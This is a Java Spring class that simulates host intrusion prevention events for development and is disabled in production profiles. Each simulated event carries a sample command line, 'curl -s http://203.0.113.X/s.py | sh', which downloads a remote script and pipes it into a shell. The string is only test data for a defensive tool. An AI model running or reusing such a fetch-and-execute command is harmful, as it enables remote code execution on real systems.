package com.socp.hips.collect.collector;

import com.socp.hips.collect.config.HipsCollectProperties;
import com.socp.hips.collect.persistence.store.HipsEventStore;
import com.socp.platform.client.service.HipsClient;
import com.socp.platform.client.http.ServiceCall;
import com.socp.platform.tenant.context.TenantContext;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.core.env.Environment;
import org.springframework.scheduling.annotation.EnableScheduling;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

import java.time.Instant;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/** Development HIPS event simulator with a durable event buffer. */
@Component
@EnableScheduling
public class EndpointSimulator {

    private static final Logger log = LoggerFactory.getLogger(EndpointSimulator.class);

    private int round;
    private final HipsClient hipsClient;
    private final HipsEventStore eventStore;
    private final HipsCollectProperties properties;
    private final Environment environment;

    public EndpointSimulator(HipsClient hipsClient, HipsEventStore eventStore,
                             HipsCollectProperties properties, Environment environment) {
        this.hipsClient = hipsClient;
        this.eventStore = eventStore;
        this.properties = properties;
        this.environment = environment;
    }

    @Scheduled(fixedDelay = 45_000, initialDelay = 25_000)
    public void simulate() {
        if (!simulationAllowed()) {
            log.info("hips-collect simulator is disabled; waiting for Falco/Agent events");
            return;
        }
        round++;
        String[] hosts = {"web01", "web02", "db-master"};
        String[] types = {"PROCESS_START", "FILE_WRITE", "NET_CONNECT", "PRIVILEGE_ESCALATION"};
        Map<String, Object> event = new LinkedHashMap<>();
        event.put("hostname", hosts[round % hosts.length]);
        event.put("agent", "falco-0.39");
        event.put("type", types[round % types.length]);
        event.put("proc", round % 2 == 0 ? "/usr/bin/curl" : "/bin/sh");
        event.put("cmdline", "curl -s http://203.0.113." + (round % 250) + "/s.py | sh");
        event.put("severity", round % 4 == 0 ? "CRITICAL" : "HIGH");
        event.put("message", "Suspicious " + event.get("type") + " on " + event.get("hostname"));
        event.put("ts", Instant.now().toString());
        event.put("tenantId", "default");
        event.put("source", "simulator");
        Map<String, Object> record = eventStore.append("default", event);

        ServiceCall call = hipsClient.reportEvent(toJson(record));
        if (!call.ok()) {
            log.warn("HIPS event forwarding failed reason={}", call.failureReason());
        }
        log.info("endpoint simulator round={} persisted", round);
    }

    public List<Map<String, Object>> events() {
        if (!simulationAllowed()) return List.of();
        String tenant = TenantContext.get();
        if (tenant == null || tenant.isBlank()) tenant = "default";
        return eventStore.list(tenant);
    }

    private boolean simulationAllowed() {
        if (!properties.isSimulationEnabled()) return false;
        return java.util.Arrays.stream(environment.getActiveProfiles())
                .map(profile -> profile.toLowerCase(java.util.Locale.ROOT))
                .noneMatch(profile -> profile.equals("prod") || profile.equals("production"));
    }

    private static String toJson(Map<String, Object> map) {
        StringBuilder json = new StringBuilder("{");
        boolean first = true;
        for (var entry : map.entrySet()) {
            if (!first) json.append(",");
            first = false;
            json.append('"').append(entry.getKey()).append("\":");
            Object value = entry.getValue();
            if (value == null) json.append("null");
            else if (value instanceof Number || value instanceof Boolean) json.append(value);
            else json.append('"').append(String.valueOf(value)
                    .replace("\\", "\\\\").replace("\"", "\\\"")).append('"');
        }
        return json.append("}").toString();
    }
}
